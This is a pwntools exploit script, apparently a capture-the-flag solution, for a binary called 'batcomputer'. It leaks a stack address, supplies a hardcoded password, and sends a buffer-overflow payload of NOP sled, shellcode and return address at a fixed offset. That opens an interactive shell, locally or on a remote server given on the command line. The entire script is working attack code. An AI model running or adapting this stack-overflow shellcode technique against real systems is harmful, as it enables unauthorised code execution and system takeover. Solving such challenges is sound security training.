from pwn import *
import time, os ,traceback, sys ,os
import binascii ,array
import re


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './batcomputer'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
#offset = find_ip(cyclic(500))
offset=84
# Start program
io = start()
io.sendlineafter(b'>','1')
#io.send(1)
stan_add=io.recvuntil(b'\n')[53:67]
#print(stan_add.decode())
stan=stan_add.decode()
stan=int(stan,16)
#stan=pwn.p64(stan)
#st=int(re.search(r"(0x[\w\d]+)",io.recvlineS()).group(0),16)
#print(st)
print(stan)

io.sendlineafter(b'>','2')
io.sendlineafter(b'Enter the password: ','b4tp@$$w0rd!')
#print(io.recvuntil(b'commands'))

shellcode=asm(shellcraft.popad())
shellcode+= asm(shellcraft.sh())
print(len(shellcode))
nopss=asm('nop')* (offset- len(shellcode))

#io= process()
#io= remote('server', 4444)
# Build the payload
payload = flat(
             [nopss,
             shellcode,
             stan,

    ]
)

# Save the payload to file
# write('payload', payload)

# Send the payload
io.sendlineafter('commands: ', payload)
io.sendlineafter(b'>','420')

io.recvuntil(b"Too bad, now who's gonna save Gotham? Alfred?\n")
#io.recvuntil(b'Thank you!')

# Got Shell?
io.interactive()

# Or, Get our flag!
#flag = io.recv()
#success(flag)
